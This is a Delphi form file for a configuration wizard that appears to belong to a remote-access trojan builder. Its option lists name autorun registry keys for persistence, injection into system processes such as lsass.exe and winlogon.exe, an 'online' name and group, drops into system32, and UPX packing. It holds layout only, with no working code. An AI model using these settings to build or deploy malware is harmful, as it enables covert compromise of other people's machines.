object FConfigSvrGuid: TFConfigSvrGuid
  Left = 245
  Top = 255
  Width = 383
  Height = 313
  Caption = #26381#21153#37197#32622#21521#23548'--'#25991#20214#37197#32622#21521#23548
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  OnShow = FormShow
  PixelsPerInch = 96
  TextHeight = 13
  object btnCancel: TBitBtn
    Left = 191
    Top = 232
    Width = 75
    Height = 25
    Caption = #21462#28040
    TabOrder = 0
    Kind = bkCancel
  end
  object btnOK: TBitBtn
    Left = 80
    Top = 232
    Width = 75
    Height = 25
    Caption = #30830#23450
    TabOrder = 1
    Kind = bkOK
  end
  object StatusBar1: TStatusBar
    Left = 0
    Top = 267
    Width = 375
    Height = 19
    Panels = <>
    SimplePanel = False
  end
  object PSvc: TPanel
    Left = 0
    Top = 0
    Width = 374
    Height = 225
    TabOrder = 4
    object Label4: TLabel
      Left = 15
      Top = 151
      Width = 70
      Height = 13
      Caption = #26174#31034#21517#31216#65306
    end
    object Label1: TLabel
      Left = 16
      Top = 194
      Width = 70
      Height = 13
      Caption = #26381#21153#25551#36848#65306
    end
    object Label5: TLabel
      Left = 15
      Top = 107
      Width = 56
      Height = 13
      Caption = #26381#21153#21517#65306
    end
    object Label6: TLabel
      Left = 16
      Top = 69
      Width = 60
      Height = 13
      Caption = #26381#21153#31867#22411#65306
    end
    object CheckBox2: TCheckBox
      Left = 76
      Top = 15
      Width = 113
      Height = 17
      Caption = #23433#35013#20026#26381#21153
      Checked = True
      State = cbChecked
      TabOrder = 0
    end
    object Edit1: TEdit
      Left = 75
      Top = 104
      Width = 216
      Height = 21
      TabOrder = 1
      Text = 'Edit1'
    end
    object Edit4: TEdit
      Left = 75
      Top = 148
      Width = 216
      Height = 21
      TabOrder = 2
      Text = 'Edit1'
    end
    object Edit3: TEdit
      Left = 75
      Top = 190
      Width = 216
      Height = 21
      TabOrder = 3
      Text = 'Edit1'
    end
    object RadioButton1: TRadioButton
      Left = 77
      Top = 66
      Width = 75
      Height = 17
      Caption = #20849#20139#26381#21153
      TabOrder = 4
    end
    object RadioButton2: TRadioButton
      Left = 163
      Top = 65
      Width = 95
      Height = 17
      Caption = #38750#20849#20139#26381#21153
      TabOrder = 5
    end
  end
  object PSetup: TPanel
    Left = 0
    Top = 0
    Width = 374
    Height = 225
    TabOrder = 5
    object cbxSetup: TCheckListBox
      Left = 1
      Top = 1
      Width = 372
      Height = 212
      Align = alTop
      ItemHeight = 13
      Items.Strings = (
        'HLM\SoftWare\MicroSoft\Windows\CurrentVersion\Run'
        'HLM\SoftWare\MicroSoft\Windows\CurrentVersion\RunOnce'
        'HLM\SoftWare\MicroSoft\Windows\CurrentVersion\RunService'
        'HCU\SoftWare\MicroSoft\Windows\CurrentVersion\Run'
        'HCU\SoftWare\MicroSoft\Windows\CurrentVersion\RunOnce'
        'HCU\SoftWare\MicroSoft\Windows\CurrentVersion\RunService')
      TabOrder = 0
    end
  end
  object PInject: TPanel
    Left = 0
    Top = 0
    Width = 374
    Height = 225
    TabOrder = 6
    object cbxInject: TCheckListBox
      Left = 1
      Top = 1
      Width = 372
      Height = 212
      Align = alTop
      ItemHeight = 13
      Items.Strings = (
        'winlogon.exe'
        'Explorer.EXE'
        'lsass.exe'
        'IEXPLORE.EXE')
      TabOrder = 0
    end
  end
  object POnLine: TPanel
    Left = -1
    Top = 1
    Width = 374
    Height = 225
    TabOrder = 7
    object Label7: TLabel
      Left = 24
      Top = 24
      Width = 60
      Height = 13
      Caption = #19978#32447#21517#31216#65306
    end
    object Label8: TLabel
      Left = 24
      Top = 59
      Width = 60
      Height = 13
      Caption = #19978#32447#20998#32452#65306
    end
    object Edit5: TEdit
      Left = 86
      Top = 20
      Width = 121
      Height = 21
      TabOrder = 0
      Text = 'Edit5'
    end
    object Edit6: TEdit
      Left = 86
      Top = 55
      Width = 121
      Height = 21
      TabOrder = 1
      Text = 'Edit6'
    end
  end
  object PFile: TPanel
    Left = 0
    Top = 0
    Width = 374
    Height = 225
    TabOrder = 3
    object Label2: TLabel
      Left = 16
      Top = 23
      Width = 48
      Height = 13
      Caption = #25991#20214#21517#65306
    end
    object edtFileName: TEdit
      Left = 66
      Top = 20
      Width = 121
      Height = 21
      TabOrder = 0
    end
    object ScrollBox1: TScrollBox
      Left = 0
      Top = 49
      Width = 372
      Height = 120
      TabOrder = 1
      object rgpPath: TRadioGroup
        Left = 0
        Top = 0
        Width = 368
        Height = 116
        Align = alClient
        Caption = '      '#36335#24452#65306
        Items.Strings = (
          'system32'
          'windows/winnt'
          'INTERNET'
          'DRIVES')
        TabOrder = 0
      end
    end
    object rbnNoShell: TRadioButton
      Left = 14
      Top = 190
      Width = 67
      Height = 17
      Caption = #19981#21152#22771
      Checked = True
      TabOrder = 2
      TabStop = True
    end
    object RadioButton3: TRadioButton
      Left = 148
      Top = 189
      Width = 67
      Height = 17
      Caption = 'UPX'
      TabOrder = 3
    end
    object RadioButton4: TRadioButton
      Left = 287
      Top = 188
      Width = 67
      Height = 17
      Caption = #20854#23427
      TabOrder = 4
    end
    object cbxFileType: TComboBox
      Left = 188
      Top = 20
      Width = 93
      Height = 21
      ItemHeight = 13
      TabOrder = 5
      Text = 'cbxFileType'
      Items.Strings = (
        '.DLL'
        '.EXE')
    end
  end
end
